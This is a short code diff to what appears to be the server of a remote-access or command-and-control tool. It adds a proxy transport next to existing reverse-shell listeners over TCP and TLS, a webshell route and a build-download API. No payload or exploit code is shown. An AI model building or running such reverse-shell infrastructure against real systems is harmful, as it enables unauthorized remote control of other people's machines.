@@ -21,6 +21,7 @@ import { webshellRouter } from "./transports/webshell.js";
 import { startTcp } from "./transports/tcp.js";
 import { startTls } from "./transports/tls.js";
 import { registerMux } from "./transports/mux.js";
+import { startProxy } from "./transports/proxy.js";
 import { dlRouter } from "./api/build.js";
 
 const here = path.dirname(fileURLToPath(import.meta.url));
@@ -112,6 +113,7 @@ app.listen(config.PORT, config.HOST, () => {
 // Raw socket reverse-shell listeners.
 startTcp();
 startTls();
+startProxy();
 
 if (config.ENABLE_WEBSHELL) {
   console.log(`[web]  webshell transport at /webshell (port ${config.PORT})`);
